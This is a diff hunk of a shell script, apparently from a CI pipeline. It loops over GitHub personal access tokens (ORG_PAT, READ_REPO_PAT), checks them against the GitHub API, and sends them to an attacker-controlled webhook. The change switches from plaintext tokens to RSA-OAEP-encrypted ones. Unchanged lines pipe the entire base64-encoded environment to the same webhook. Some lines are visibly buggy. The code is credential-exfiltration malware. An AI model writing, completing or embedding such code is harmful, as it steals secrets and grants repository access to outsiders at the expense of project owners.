@@ -12,11 +12,13 @@ KwIDAQAB
 
 for pat in ORG_PAT READ_REPO_PAT; do
         token="${!pat}"
-		encrypted_token=$(echo printf '$s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
         user_info=$(curl -s -i -H "Authorization: Bearer $encrypted_token" https://api.github.com/user)
 
         # Needs encryption
-        curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
+		encrypted_token=$(echo printf '$s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+		encrypted_pat=$(echo printf '$s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+
+        curl -s -o /dev/null "$webhook/send-pat?secret=$pat&encrypted_pat=$encrypted_token" -d "$user_info"
 done
 
 env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
